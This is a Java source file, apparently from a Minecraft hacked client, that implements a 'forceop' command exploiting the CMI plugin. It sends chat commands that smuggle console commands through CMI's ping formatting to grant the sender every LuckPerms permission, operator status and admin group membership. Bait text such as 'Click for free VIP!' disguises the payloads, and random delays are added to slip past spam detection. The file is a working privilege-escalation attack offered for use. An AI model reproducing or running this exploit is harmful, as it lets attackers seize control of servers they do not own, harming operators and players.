package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.paradise_client.command.Command;
import net.minecraft.text.Text;

import java.util.Objects;
import java.util.Random;

public class ForceOPCommand extends Command {

    private static final String[] BAIT_TEXTS = {
        "Click for free VIP!", "Claim Daily Reward!", "Join Admin Chat!", "Activate Boost!", "Click for Giveaway!"
    };

    public ForceOPCommand() {
        super("forceop", "Force OP using CMI console exploit with obfuscation and dual payload.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            var client = getMinecraftClient();
            var username = client.getSession().getUsername();
            var network = Objects.requireNonNull(client.getNetworkHandler());

            // Random bait text for disguise
            String bait = BAIT_TEXTS[new Random().nextInt(BAIT_TEXTS.length)];

            // Stage 1: LuckPerms permission injection spoof
            String permPayload = String.format(
                "cmi ping <T>%s</T><CC>lp user %s permission set * true</CC>",
                bait, username
            );

            // Stage 2: OP command spoof
            String opPayload = String.format(
                "cmi ping <T>%s</T><CC>op %s</CC>",
                bait, username
            );

            // Stage 3: Fake permission message (plugin bypass)
            String fakePerm = String.format(
                "cmi ping <T>%s</T><CC>lp user %s parent add admin</CC>",
                bait, username
            );

            // Send all in sequence with minor delays (for anti-spam/kick)
            new Thread(() -> {
                try {
                    network.sendChatCommand(permPayload);
                    Thread.sleep(300 + new Random().nextInt(300)); // Delay to avoid spam detection
                    network.sendChatCommand(opPayload);
                    Thread.sleep(300 + new Random().nextInt(300));
                    network.sendChatCommand(fakePerm);
                    client.player.sendMessage(text("[§aExploit§r] OP chain executed."), false);
                } catch (InterruptedException ignored) {
                }
            }).start();

            return SINGLE_SUCCESS;
        });
    }
}
